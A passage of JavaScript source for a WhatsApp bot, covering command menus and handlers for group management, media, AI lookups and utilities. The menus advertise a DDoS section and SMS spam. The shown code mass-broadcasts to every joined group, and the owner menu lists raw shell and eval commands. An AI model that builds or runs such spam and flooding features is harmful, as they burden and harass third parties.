│  ◦  ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break    
        case "animemenu": case "animemenu":
        reply(`
╭┈──────────────────
│ *${m2}[ A N I M E - M E N U ‎ • ]${m2}*
╭┈──────────────────
│◦ ᴀᴋɪʀᴀ
│◦ ᴀᴋɪʏᴀᴍᴀ
│◦ ᴀɴɪᴍᴇsᴇᴀʀᴄʜ
│◦ ᴀɴᴀ
│◦ ᴀɴɪᴍᴇᴠɪᴅᴇᴏ
│◦ ᴀʀᴛ
│◦ ᴀsᴜɴᴀ
│◦ ᴀʏᴜᴢᴀᴡᴀ
│◦ ʙᴏʀᴜᴛᴏ
│◦ ʙᴛs
│◦ ᴄʜɪʜᴏ
│◦ ᴄʜɪᴛᴏɢᴇ
│◦ ᴄᴏsᴘʟᴀʏ
│◦ ᴄᴏsᴘʟᴀʏʟᴏʟɪ
│◦ ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
│◦ ᴄʏʙᴇʀ
│◦ ᴅᴇɪᴅᴀʀᴀ
│◦ ᴅᴏʀᴀᴇᴍᴏɴ
│◦ ᴇʟᴀɪɴᴀ
│◦ ᴇᴍɪʟɪᴀ
│◦ ᴇʀᴢᴀ
│◦ ᴇxᴏ
│◦ ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ
│◦ ɢʀᴇᴍᴏʀʏ
│◦ ʜᴀᴄᴋᴇʀ
│◦ ʜᴇsᴛɪᴀ
│◦ ʜɪɴᴀᴛᴀ
│◦ ʜᴜsʙᴜ
│◦ ɪɴᴏʀɪ
│◦ ɪsʟᴀᴍɪᴄ
│◦ ɪsᴜᴢᴜ
│◦ ɪᴛᴀᴄʜɪ
│◦ ɪᴛᴏʀɪ
│◦ ᴊᴇɴɴɪᴇ
│◦ ᴊɪsᴏ
│◦ ᴊᴜsᴛɪɴᴀ
│◦ ᴋᴀɢᴀ
│◦ ᴋᴀɢᴜʀᴀ
│◦ ᴋᴀᴋᴀsɪʜ
│◦ ᴋᴀᴏʀɪ
│◦ ᴄᴀʀᴛᴏᴏɴ
│◦ sʜᴏʀᴛǫᴜᴏᴛᴇ
│◦ ᴋᴇɴᴇᴋɪ
│◦ ᴋᴏᴛᴏʀɪ
│◦ ᴋᴜʀᴜᴍɪ
│◦ ʟɪsᴀ
│◦ ᴍᴀᴅᴀʀᴀ
│◦ ᴍᴇɢᴜᴍɪɴ
│◦ ᴍɪᴋᴀsᴀ
│◦ ᴍɪᴋᴇʏ
│◦ ᴍɪᴋᴜ
│◦ ᴍɪɴᴀᴛᴏ
│◦ ᴍᴏᴜɴᴛᴀɪɴ
│◦ ɴᴀʀᴜᴛᴏ
│◦ ɴᴇᴋᴏ2
│◦ ɴᴇᴋᴏɴɪᴍᴇ
│◦ ɴᴇᴢᴜᴋᴏ
│◦ ᴏɴᴇᴘɪᴇᴄᴇ
│◦ ᴘᴇɴᴛᴏʟ
│◦ ᴘᴏᴋᴇᴍᴏɴ
│◦ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
│◦ ʀɪᴢᴇ
│◦ ʀᴏsᴇ
│◦ sᴀɢɪʀɪ 
│◦ sᴀᴋᴜʀᴀ 
│◦ sᴀsᴜᴋᴇ 
│◦ sᴀᴛᴀɴɪᴄ 
│◦ sʜɪɴᴀ 
│◦ sʜɪɴᴋᴀ 
│◦ sʜɪɴᴏᴍɪʏᴀ 
│◦ sʜɪᴢᴜᴋᴀ 
│◦ sʜᴏᴛᴀ 
│◦ sᴘᴀᴄᴇ
│◦ ᴛᴇᴄʜɴᴏʟᴏɢʏ 
│◦ ᴛᴇᴊɪɴᴀ 
│◦ ᴛᴏᴜᴋᴀᴄʜᴀɴ 
│◦ ᴛsᴜɴᴀᴅᴇ 
│◦ ʏᴏᴛsᴜʙᴀ 
│◦ ʏᴜᴋɪ 
│◦ ʏᴜʟɪʙᴏᴄɪʟ 
│◦ ʏᴜᴍᴇᴋᴏ 
╰┈────────────────•
${m2}*[ R E A C T I O N - M E N U ]*${m2}
╭┈────────────────•
│  ◦  ᴋɪʟʟ
│  ◦  ᴘᴀᴛ
│  ◦  ʟɪᴄᴋ
│  ◦  ʙɪᴛᴇ
│  ◦  ʏᴇᴇᴛ
│  ◦  ʙᴏɴᴋ
│  ◦  ᴡɪɴᴋ
│  ◦  ᴘᴏᴋᴇ
│  ◦  ɴᴏᴍ
│  ◦  sʟᴀᴘ
│  ◦  sᴍɪʟᴇ
│  ◦  ᴡᴀᴠᴇ
│  ◦  ʙʟᴜsʜ
│  ◦  sᴍᴜɢ
│  ◦  ɢʟᴏᴍᴘ
│  ◦  ʜᴀᴘᴘʏ
│  ◦  ᴅᴀɴᴄᴇ
│  ◦  ᴄʀɪɴɢᴇ
│  ◦  ʜɪɢʜғɪᴠᴇ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break    
        
  case "nsfw": case "nsfwmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ N S F W - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ɢᴇɴsʜɪɴ
│  ◦  sᴡɪᴍsᴜɪᴛ 
│  ◦  sᴄʜᴏᴏʟsᴡɪᴍsᴜɪᴛ
│  ◦  ᴡʜɪᴛᴇ 
│  ◦  ʙᴀʀᴇғᴏᴏᴛ 
│  ◦  ᴛᴏᴜʜᴏᴜ 
│  ◦  ɢᴀᴍᴇᴄɢ 
│  ◦  ʜᴏʟᴏʟɪᴠᴇ 
│  ◦  ᴜɴᴄᴇɴsᴏʀᴇᴅ 
│  ◦  sᴜɴɢɢʟᴀssᴇs 
│  ◦  ɢʟᴀssᴇs
│  ◦  ᴡᴇᴀᴘᴏɴ 
│  ◦  sʜɪʀᴛʟɪғᴛ
│  ◦  ᴄʜᴀɪɴ 
│  ◦  ғɪɴɢᴇʀɪɴɢ 
│  ◦  ғʟᴀᴛᴄʜᴇsᴛ 
│  ◦  ᴛᴏʀɴᴄʟᴏᴛʜ 
│  ◦  ʙᴏɴᴅᴀɢᴇ 
│  ◦  ᴅᴇᴍᴏɴ
│  ◦  ᴘᴀɴᴛʏᴘᴜʟʟ 
│  ◦  ʜᴇᴀᴅᴘʜᴏɴᴇ 
│  ◦  ʜᴇᴀᴅᴅʀᴇss 
│  ◦  ᴀɴᴜsᴠɪᴇᴡ
│  ◦  sʜᴏʀᴛs 
│  ◦  sᴛᴏᴋɪɴɢs 
│  ◦  ᴛᴏᴘʟᴇss 
│  ◦  ʙᴇᴀᴄʜ 
│  ◦  ʙᴜɴɴʏɢɪʀʟ 
│  ◦  ʙᴜɴɴʏᴇᴀʀ 
│  ◦  ᴠᴀᴍᴘɪʀᴇ 
│  ◦  ʙɪᴋɪɴɪ 
│  ◦  ɴᴏʙʀᴀ
│  ◦  ᴡʜɪᴛᴇʜᴀɪʀ 
│  ◦  ʙʟᴏɴᴅᴇ 
│  ◦  ᴘɪɴᴋʜᴀɪʀ 
│  ◦  ʙᴇᴅ 
│  ◦  ᴘᴏɴʏᴛᴀɪʟ 
│  ◦  ɴᴜᴅᴇ 
│  ◦  ᴅʀᴇss 
│  ◦  ᴜɴᴅᴇʀᴡᴇᴀʀ 
│  ◦ ᴜɴɪғᴏʀᴍ
│  ◦  ғᴏxɢɪʀʟ 
│  ◦  sᴋɪʀᴛ 
│  ◦  ʙʀᴇᴀsᴛ 
│  ◦  ᴛᴡɪɴᴛᴀɪʟ 
│  ◦  sᴘʀᴇᴀᴅᴘᴜssʏ 
│  ◦  sᴇᴇᴛʜʀᴏᴜɢʜ 
│  ◦  ʙʀᴇᴀsᴛʜᴏʟᴅ 
│  ◦  ғᴀᴛᴇsᴇʀɪᴇs 
│  ◦  sᴘʀᴇᴀᴅʟᴇɢs 
│  ◦  ᴏᴘᴇɴsʜɪʀᴛ 
│  ◦  ʜᴇᴀᴅʙᴀɴᴅ 
│  ◦  ɴɪᴘᴘʟᴇs 
│  ◦  ᴇʀᴇᴄᴛɴɪᴘᴘʟᴇs 
│  ◦  ɢʀᴇᴇɴʜᴀɪʀ 
│  ◦  ᴡᴏʟғɢɪʀʟ 
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`) 
          break 
          
       case "mainmon": case "mainmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •  S Y S T E M - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴅɪꜱᴋ
│  ◦  ᴘɪɴɢ
│  ◦  ᴀʟɪᴠᴇ
│  ◦  sʏsᴛᴇᴍ
│  ◦  ʀᴜɴᴛɪᴍᴇ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "toolsmon": case "toolsmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •  T O O L S - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴛᴛꜱ
│  ◦  ᴠᴠ
│  ◦  ᴛʀᴀɴsʟᴀᴛᴇ
│  ◦  sᴛɪᴄᴋᴇʀ-sᴇᴀʀᴄʜ
│  ◦  ᴀᴍᴀᴢᴏɴ
│  ◦  ᴍʏɪᴘ
│  ◦  ɪᴘ
│  ◦  ʀᴇᴍᴏᴠᴇʙɢ
│  ◦  ʀᴇᴀᴅᴍᴏʀᴇ
│  ◦  ᴏᴄʀ
│  ◦  ᴄᴀʟᴄᴜʟᴀᴛᴏʀ
│  ◦  ǫᴜʀᴀɴ
│  ◦  ʙɪʙʟᴇ
│  ◦  ᴘᴇʀɪᴏᴅɪᴄ-ᴛᴀʙʟᴇ
│  ◦  ʀᴇᴘᴏ
│  ◦  ᴘɪɴᴄʜᴀᴛ
│  ◦  ᴇᴍᴏᴊɪᴍɪx
│  ◦  ᴜɴᴘɪɴᴄʜᴀᴛ
│  ◦  ᴍᴇᴍᴇ
│  ◦  ᴄʜᴀɴɴᴇʟ
│  ◦  ʜᴅᴠɪᴅᴇᴏ
│  ◦  ᴄᴏɴᴠᴇʀᴛ
│  ◦  ᴘᴀssᴡᴏʀᴅ
│  ◦  ʟɪsᴛᴄᴜʀʀᴇɴᴄʏ
│  ◦  ᴄᴏɴᴠᴇʀᴛɪᴍᴇ
│  ◦  ɢᴇᴛ
│  ◦  ᴄʀᴇᴀᴛᴇᴍᴇᴍᴇ
│  ◦  ʀᴇᴍɪɴᴅᴍᴇ
│  ◦  ss 
│  ◦  sᴀᴠᴇ
│  ◦  ʟᴀɴɢᴜᴀɢᴇs
│  ◦  ᴄᴏᴜᴘʟᴇᴘᴘ
│  ◦  ᴇɴᴄʀʏᴘᴛ
│  ◦  ᴄʀᴇᴅɪᴛs
│  ◦  sᴜᴘᴘᴏʀᴛ
│  ◦  ʀᴇᴘᴏsᴛ
│  ◦  ᴠᴠ2
│  ◦  ᴍᴏᴠɪᴇ
│  ◦  ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ
│  ◦  ᴠᴏʟᴠɪᴅ
│  ◦  ʀᴇᴍɪɴɪ
│  ◦  ᴋᴅʀᴀᴍᴀ
│  ◦  ᴄʜᴀɴɴᴇʟ
│  ◦  ғʟɪᴘᴛᴇxᴛ
│  ◦  sᴘᴀᴍsᴍs
│  ◦  ᴡᴇᴀᴛʜᴇʀ
│  ◦  ᴍᴏᴅᴀᴘᴋ
│  ◦  ᴛᴇʀᴀʙᴏx
│  ◦  ᴛɪɴʏᴜʀʟ
│  ◦  ᴠᴏʟᴠɪᴅ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
              case "stalkermenu": case "stalkmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ S T A L K - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ɢɪᴛʜᴜʙsᴛᴀʟᴋ
│  ◦  ɪɢsᴛᴀʟᴋ
│  ◦  ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break 
      case "stickermon": case "stickermenu": case "stikermenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •S T I C K E R - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ꜱᴛɪᴄᴋᴇʀ
│  ◦  ᴄʟꜱ
│  ◦  ꜱᴍᴇᴍᴇ 
│  ◦  ᴛᴀᴋᴇ
│  ◦  ǫᴄ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "ddosmenu": case "ddosmon":
        reply(`
╭┈──────────────────
│ *${m2}[ •  D D O S - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴅᴏᴡɴ1
│  ◦  ᴅᴏᴡɴ2
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "tempormon": case "tempormenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •  T E M P - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴛᴇᴍᴘ-ꜱᴛᴀʀᴛ 
│  ◦  ᴛᴇᴍᴘ-ꜱᴛᴏᴘ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        case "anitamenu": case "botmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •  B O T - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴀɴɪᴛᴀ-ᴘᴀɪʀɪɴɢ
│  ◦  ǫᴀɴɪᴛᴀ-ꜱᴄᴀɴ
│  ◦  ꜱᴛᴀʀᴛ-ᴀɴɪᴛᴀ
│  ◦  ꜱᴛᴏᴘ-ᴀɴɪᴛᴀ
│  ◦  ʟɪꜱᴛ-ᴀɴɪᴛᴀ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
    case "ownermon": case "ownermenu":
        reply(`
╭┈──────────────────
│ *${m2}[ O W N E R - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦   ᴄʜᴀᴛʙᴏᴛ <ᴏɴ/ᴏғғ>
│  ◦   ᴜᴘᴅᴀᴛᴇ
│  ◦   sʜᴜᴛᴅᴏᴡɴ
│  ◦   ᴍᴏᴅᴇ-ᴘʀɪᴠᴀᴛᴇ
│  ◦   ᴍᴏᴅᴇ-ᴘᴜʙʟɪᴄ
│  ◦   sᴇᴛʙɪᴏ 
│  ◦   ʀᴇᴘᴏʀᴛ
│  ◦   ᴄʟᴇᴀʀᴄʜᴀᴛ
│  ◦   ᴄʜᴀɴɴᴇʟ
│  ◦   sᴇᴛᴘᴘ 
│  ◦   ɢᴇᴛᴘᴘ
│  ◦   ɢᴇᴛʙɪᴏ
│  ◦   ᴄᴏᴜɴᴛᴅᴏᴡɴ
│  ◦   ʟɪsᴛʙʟᴏᴄᴋ
│  ◦   ʙʟᴏᴄᴋ
│  ◦   ᴜɴʙʟᴏᴄᴋ
│  ◦   ʀᴇsᴛᴀʀᴛ
│  ◦   ᴀᴜᴛᴏʀᴇᴀᴄᴛ <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏᴛʏᴘɪɴɢ    <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ <ᴏɴ/ᴏғғ>
│  ◦   ᴀʟᴡᴀʏsᴏɴʟɪɴᴇ  <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏʀᴇᴀᴅ <ᴏɴ/ᴏғғ> 
│  ◦   ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ
│  ◦   ᴅᴇʟᴇᴛᴇ
│  ◦   ᴋɪᴄᴋ
│  ◦   ᴍᴏᴅᴇ
│  ◦   sᴜᴅᴏ
│  ◦   ᴅᴇʟsᴜᴅᴏ
│  ◦   $ 
│  ◦   =>
│  ◦   > 
│  ◦   ᴘʀᴇᴍᴜɪᴍ
│  ◦   ᴀᴅᴅᴄᴀꜱᴇ
│  ◦   ᴅᴇʟᴄᴀꜱᴇ
│  ◦   ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦   ʀᴇꜱᴛᴀʀᴛ
│  ◦   ꜱᴛᴏᴘ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
 
    case 'owner': case 'creator':{
        setTimeout(async ()  => {
 ptz.sendContact(m.chat, global.nomerowner, fsaluran)
            }, 1200)
await ptz.sendMessage(m?.chat, {react: {text: `👑`,key: m?.key,}})
ptz.sendMessage(m?.chat, {text: '*Here is my Handsome Owner😍✨!*',key: m?.key,})           
}
        break        
 case 'textimg': case 'txt2img':
if (!text) return reply(`Example: .${command} rain on road`)
let anu = await fetch(`https://widipe.com/ai/text2img?text=${text}`)
await ptz.sendMessage(m.chat, {image: {url:anu}, caption: `still error ${text}`},{quoted:fsaluran})
break    



       
        case "ramlist": case "listram":
        let ckckk = `*${m2}[ LIST RAM AVAILABLE ]${m2}*
 ‎‎⟢• ─────────── •⟢
│ 1gb     ••      ☑️
│ 2gb     ••      ☑️
│ 3gb     ••      ☑️
│ 4gb     ••      ☑️
│ 5gb     ••      ☑️
│ 6gb     ••      ☑️
│ 7gb     ••      ☑️
│ 8gb     ••      ☑️
│ unli     ••      ☑️
 ‎‎⟢• ─────────── •⟢`
reply (ckckk)
break
        case "tagall":
let teks = `〘      *Tag All*     〙
 •• *Message : ${q ? q : 'empty'}* ••\n\n`
for (let mem of participants) {
teks += `☌  @${mem.id.split('@')[0]}\n`
}
ptz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fsaluran})
break
case 'hidetag': case 'ht': {
ptz.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

       case 'git': case 'gitclone':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DeeCeeXxx/Queen_Anita-V3`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(`error`))
break

        case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply('Owner only')
await loading()
if (!text) return reply(`Text?\n\nExample : ${prefix + command} Update QUEEN_ANITA-V3 !`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Send Broadcast To ${anu.length} Group Chat.`)
for (let i of anu) {
await sleep(1500)
ptz.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
reply(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break
   case 'jpm':{
if (!isCreator) return reply("?")
if (!text) return reply(`*Input Format*\n${prefix+command} text|pause\nReply photo to jpm Give a pause, 1000 = 1 second\n\nExample: ${prefix + command} single siamang keris|4000`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ptz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)
await ptz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ptz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break


        
 /* ################# Thaks ############### */
 
 
 
 
 
 
 

 
 
 
 
 
 
 
 
//=================================================//
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to add')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('Enter the number you want to demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
/*ase "ai":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
reply(data.result)
}
break*/
//=================================================//
case "gemini-img":{
if (!quoted) return reply(`Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("only support images")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
reply(data.text)
}
break
//=================================================//
case "gemini":{
if (!text) return reply("what do you want to ask me?")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return reply(`convert image with .ocr command`)
if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*type ${mime} not supported!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ptz.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await reply(Results.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await ptz.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "translate":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else return reply(`Example: Translate id Hello i am robot`) 

let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : This Language"${lang}"Not Supported\nType .languages`)
reply(`*Language Detected:* ${res.from?.language.iso}\n*To Language:* ${lang}\n\n*Translation:* ${res.text}`.trim())
}
break
//=================================================//
/*case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return reply('Originally *URL* with http:// or https://')
let krt = await ssweb(text)
ptz.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:fsaluran})
}
break*/
//=================================================//
case "calculator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('The contents?')
    reply('Wrong format, only 0-9 and Symbols -, +, *, /, ×, ÷, π, e, (, ) supported')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
reply('error')
}}
break
//=================================================//
case "jarak":{
var [from, to] = text.split`|`
if (!(from && to)) return reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(from, to)
if (data.img) return ptz.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted:fsaluran })
else reply(data.desc)
}
break
//=================================================//

//=================================================//
case 'take': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts2':{
if (!text) return reply(`[ ! ] ${prefix}${command} hello world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
ptz.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini1':{
if (!quoted) return reply(`Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("only support images")
let media = await quoted.download()
const This = await remini(media, "enhance");
ptz.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//

case "get": {
if (!/^https?:\/\//.test(text)) return reply('Originally *URL* with http:// or https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
